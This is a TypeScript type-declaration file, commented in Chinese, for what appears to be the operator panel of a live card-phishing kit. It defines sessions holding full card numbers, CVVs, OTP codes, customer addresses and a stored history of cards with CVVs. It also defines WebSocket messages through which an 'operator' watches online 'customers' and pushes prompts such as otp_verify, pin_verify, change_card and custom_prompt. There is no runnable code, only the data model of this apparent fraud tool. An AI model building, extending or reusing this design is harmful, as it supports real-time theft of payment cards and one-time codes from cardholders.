declare namespace Api {
  namespace Payment {
    /** 支付会话步骤 */
    type SessionStep = 'product' | 'address' | 'card' | 'otp' | 'completed';

    /** 支付会话状态 */
    type SessionStatus = 'live' | 'pending' | 'processing' | 'approved' | 'rejected' | 'cancelled' | 'otp_required';

    /** 卡片信息 */
    interface CardInfo {
      cardType: string;
      cardLevel: string;
      bankName: string;
      cardNumber: string;
      expiry: string;
      cvv: string;
      otpCode: string;
      cardHolder?: string;
    }

    /** 用户信息 */
    interface CustomerInfo {
      firstName: string;
      lastName: string;
      fullName: string;
      email: string;
      phone: string;
      country: string;
      address1: string;
      address2: string;
      city: string;
      state: string;
    }

    /** 浏览页签 */
    interface BrowsingTab {
      label: string;
      count: number;
      active: boolean;
    }

    /** 历史卡片记录 */
    interface CardHistoryEntry {
      cardNumber: string;
      cardType: string;
      cardLevel: string;
      bankName: string;
      expiry: string;
      cvv: string;
      cardHolder: string;
    }

    /** 支付会话 */
    interface PaymentSession {
      id: string;
      sessionId: number;
      frontendUrl: string;
      status: SessionStatus;
      currentStep: SessionStep;
      cardInfo: CardInfo;
      customerInfo: CustomerInfo;
      browsingTabs: BrowsingTab[];
      cardHistory: CardHistoryEntry[];
      createdAt: string;
      updatedAt: string;
      countdownSeconds: number;
      isOnline: boolean;
    }

    /** WebSocket 消息类型 */
    type WsMessageType = 
      | 'session_new'
      | 'session_update'
      | 'session_remove'
      | 'session_list'
      | 'operator_action'
      | 'customer_input'
      | 'heartbeat'
      | 'connect_count'
      | 'error';

    /** WebSocket 消息 */
    interface WsMessage<T = any> {
      type: WsMessageType;
      sessionId?: string;
      payload: T;
      timestamp: string;
    }

    /** 操作动作 */
    type OperatorAction = 
      | 'otp_verify'
      | 'custom_otp_verify'
      | 'email_verify'
      | 'pin_verify'
      | 'cvv_verify'
      | 'app_verify'
      | 'question_verify'
      | 'change_card'
      | 'card_error'
      | 'otp_error'
      | 'custom_prompt'
      | 'change_card_prompt'
      | 'redirect_complete'
      | 'approve'
      | 'reject';

    /** 操作事件 */
    interface ActionEvent {
      action: OperatorAction;
      sessionId: string;
      message?: string;
      operatorId?: string;
    }

    /** 连接统计 */
    interface ConnectCount {
      customerCount: number;
      operatorCount: number;
    }
  }
}
